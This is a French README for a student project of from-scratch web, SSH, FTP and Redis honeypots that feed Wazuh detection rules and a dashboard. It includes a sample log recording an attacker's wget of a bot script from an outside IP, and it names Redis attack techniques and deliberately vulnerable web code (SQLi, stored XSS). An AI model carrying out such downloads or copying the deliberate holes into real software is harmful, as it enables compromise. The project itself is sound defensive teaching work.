# Honeypot from scratch + SIEM Wazuh

Projet ESGI — plateforme de honeypots développés from scratch, avec centralisation des logs,
détection d'attaques et visualisation dans un dashboard web (Wazuh), déployée automatiquement.

## Architecture

```
                    Attaquant
                        │
        ┌───────────────▼───────────────┐            ┌──────────────────────────────┐
        │  NIX01 (192.168.56.101)       │            │  SRV01 (192.168.56.102)      │
        │                               │            │                              │
        │  Web SweetBuzz (Flask)  :5000 │            │  Wazuh manager 4.14          │
        │  SSH  (faux shell)      :2222 │            │   ├─ décodeur hp-access      │
        │  FTP  (PASV, uploads)     :21 │  1514/tcp  │   ├─ décodeur JSON natif     │
        │  Redis (RESP)           :6379 ├───────────►│   ├─ ~45 règles (MITRE)      │
        │   └─ /var/log/honeypots/*.json│   agent    │   ├─ Wazuh indexer           │
        │  auditd (privesc) + FIM       │            │   └─ dashboard « Honeypot »  │
        │  Agent Wazuh                  │            │       (HTTPS :443)           │
        └───────────────────────────────┘            └──────────────────────────────┘
```

| Honeypot | Port | Code | Ce qui est capturé |
|---|---|---|---|
| Web *SweetBuzz* | 5000 | Flask + gunicorn (`honeypots/web-sweetbuzz/`) | SQLi, XSS stockée, méthode HTTP, scanners, chemins sensibles, brute force 404 |
| SSH | 2222 | Python, paramiko = transport uniquement (`honeypots/ssh/`) | identifiants, clés publiques, chaque commande du faux shell, URLs wget/curl |
| FTP | 21 | asyncio pur (`honeypots/ftp/`) | USER/PASS, commandes, téléchargements, fichiers déposés (conservés, sha256) |
| Redis | 6379 | asyncio pur, protocole RESP (`honeypots/redis/`) | AUTH, CONFIG SET dir/dbfilename + SAVE, SLAVEOF, MODULE LOAD, EVAL, HTTP cross-protocol |

Les honeypots SSH/FTP/Redis tournent sous l'utilisateur non privilégié `honeypot` (FTP : seule la
capacité `CAP_NET_BIND_SERVICE`), un service systemd chacun, et écrivent un événement JSON par ligne :

```json
{"timestamp":"…","honeypot":"ssh","event_type":"command","srcip":"192.168.56.1","src_port":51234,
 "session":"a1b2c3d4e5f6","username":"root","command":"wget http://198.51.100.7/bot.sh","url":"http://198.51.100.7/bot.sh"}
```

## État d'avancement

**Terminé**
- [x] Honeypot web *SweetBuzz Honey Co.* : SQLi, XSS stockée, contournement par la méthode HTTP ; journal `HONEYPOT-ACCESS src=… method=… path=… body=… ua=… xff=…` (IP source = pair TCP, non falsifiable)
- [x] Honeypot SSH (port 2222) : faux shell interactif + `ssh host cmd`, identifiants, commandes, téléchargements
- [x] Honeypot FTP (port 21) : PASV/EPSV (ports 30000-30009), LIST/RETR sur un faux FS, STOR conservé par sha256
- [x] Honeypot Redis (port 6379) : RESP + commandes inline, Redis 5.0.7 crédible
- [x] Wazuh : décodeur `hp-access`, ~45 règles (web 1001xx, privesc 1002xx, FIM 100300, SSH/FTP/Redis 1004xx) avec MITRE ATT&CK, brute force, corrélation Redis CONFIG SET + SAVE
- [x] Dashboard Wazuh « Honeypot » (alertes par honeypot, timeline, top IP / usernames / mots de passe / commandes, règles, MITRE, uploads) importé automatiquement
- [x] Secret Flask généré au déploiement (hors dépôt), gunicorn au lieu du serveur de dev
- [x] Déploiement automatique de A à Z : `vagrant up`, scripts idempotents
- [x] Tests : statique (sans VM), NIX01, SRV01, bout en bout ; script d'attaque pour la démo `tools/attack_demo.py`

## Structure du dépôt

| Chemin | Contenu |
|---|---|
| `Vagrantfile` | Déploiement complet du lab en une commande (`vagrant up`) |
| `deploy/vagrant/provision.sh` | Vérifications, copie du dépôt, Wazuh all-in-one (SRV01), utilisateur + déploiement (NIX01) |
| `deploy/srv01.sh` | Décodeur + règles (web, privesc, SSH/FTP/Redis), logall, smoke test, import du dashboard |
| `deploy/nix01.sh` | SweetBuzz + auditd + agent Wazuh, puis `deploy/honeypots.sh` |
| `deploy/honeypots.sh` | Honeypots SSH/FTP/Redis : utilisateur `honeypot`, `/opt/honeypots`, systemd, logrotate, `<localfile>` JSON |
| `deploy/dashboard.sh` | Import du dashboard (`POST /api/saved_objects/_import`) |
| `honeypots/web-sweetbuzz/` | Honeypot web (Flask) + service systemd (source unique installée par `nix01.sh`) |
| `honeypots/ssh/`, `ftp/`, `redis/` | Honeypots from scratch + leur service systemd |
| `honeypots/common/hplog.py` | Journalisation JSON lines commune |
| `wazuh/manager/` | Décodeur et règles (copies de référence de ce que déploie `srv01.sh`, vérifiées par les tests) |
| `wazuh/agent/` | Bloc `ossec.conf` de l'agent + règles auditd |
| `wazuh/dashboard/` | `honeypot-dashboard.ndjson` (généré par `tools/build_dashboard.py`) |
| `tests/` | Tests automatiques (voir `tests/README.md`), `cases.tsv` (web), `hp_cases.tsv` (SSH/FTP/Redis) |
| `tools/` | `attack_demo.py` (scénario d'attaque de la démo), `show_alerts.py` (résumé des alertes), `build_dashboard.py` |
| `docs/` | Rapport technique, captures, exemple de log |

## Déploiement automatique (une commande)

**Prérequis sur le PC hôte :** [VirtualBox](https://www.virtualbox.org/) 7.x, [Vagrant](https://developer.hashicorp.com/vagrant/install) ≥ 2.3, 10 Go de RAM libres et environ 40 Go de disque.
Aucun ISO à télécharger : Vagrant récupère l'image Ubuntu 24.04 tout seul.

```bash
git clone https://github.com/9adidaa/honeypot-wazuh.git
cd honeypot-wazuh
vagrant up            # 20-30 min la première fois
```

`vagrant up` fait tout, sans intervention :

| Étape | Détail |
|---|---|
| Réseau | crée le réseau host-only `192.168.56.0/24`, **désactive son DHCP**, fixe les IP de SRV01 (.102) et NIX01 (.101) |
| Vérifications | Ubuntu 22.04/24.04, architecture, RAM, disque, IP host-only, accès Internet (arrêt avec un message clair sinon) |
| Système | hostname, `/etc/hosts`, NTP, paquets de base, conversion CRLF→LF si cloné sous Windows |
| SRV01 | installation de Wazuh 4.14 all-in-one, puis `deploy/srv01.sh` (décodeur + règles) |
| SRV01 (suite) | import du dashboard « Honeypot » |
| NIX01 | utilisateur `nix01`, attente du manager, `deploy/nix01.sh` (web + auditd + agent + SSH/FTP/Redis), puis `tests/test_nix01.sh` |

Ensuite :
- Honeypots : http://192.168.56.101:5000, `ssh -p 2222 root@192.168.56.101`, `ftp 192.168.56.101`, `redis-cli -h 192.168.56.101`
- Dashboard Wazuh : https://192.168.56.102 → *Dashboards* → **Honeypot** (identifiants dans `.secrets/wazuh-admin.txt`)
- Test complet : `vagrant ssh srv01 -c "sudo bash /vagrant/tests/test_srv01.sh --e2e"`

## Démo

```bash
# depuis le PC hôte (pip install paramiko) ou depuis SRV01 (vagrant ssh srv01)
python3 tools/attack_demo.py --slow                 # web + SSH + FTP + Redis
python3 tools/attack_demo.py --only ssh,redis       # un sous-ensemble
vagrant ssh srv01 -c "sudo python3 /vagrant/tools/show_alerts.py --since 15"
```

| Commande | Effet |
|---|---|
| `vagrant status` | état des VM |
| `vagrant ssh srv01` / `vagrant ssh nix01` | se connecter à une VM |
| `vagrant provision` | relancer le déploiement (idempotent) |
| `vagrant halt` / `vagrant up` | éteindre / rallumer |
| `vagrant destroy -f` | tout supprimer |

Moins de RAM sur le PC : `SRV01_MEM=4096 vagrant up` (minimum 4 Go pour Wazuh).

<details><summary>Déploiement manuel (sans Vagrant)</summary>

2 VM Ubuntu Server 24.04 avec une carte host-only en `192.168.56.0/24` (DHCP désactivé) :

```bash
# SRV01 (192.168.56.102)
curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh && sudo bash wazuh-install.sh -a -i
sudo bash deploy/srv01.sh

# NIX01 (192.168.56.101), utilisateur nix01
sudo MANAGER_IP=192.168.56.102 bash deploy/nix01.sh
```
</details>

## Tests

```bash
python3 tests/test_static.py                  # sans VM : scripts, XML, règles, honeypots lancés + attaqués
sudo bash tests/test_nix01.sh --trigger       # sur NIX01
sudo bash tests/test_srv01.sh --e2e           # sur SRV01 : règles + attaques réelles (web/SSH/FTP/Redis) -> alertes
sudo bash tests/test_srv01.sh --since 10      # sur SRV01 : alertes privesc/FIM
```

## Avertissement

Les honeypots contiennent des vulnérabilités **réelles et volontaires** (le web en particulier). À n'utiliser que dans un
lab isolé, jamais exposé sur Internet. Les identifiants présents dans la documentation sont ceux des VM de lab.

## Équipe

| Membre | Rôle |
|---|---|
| … | … |
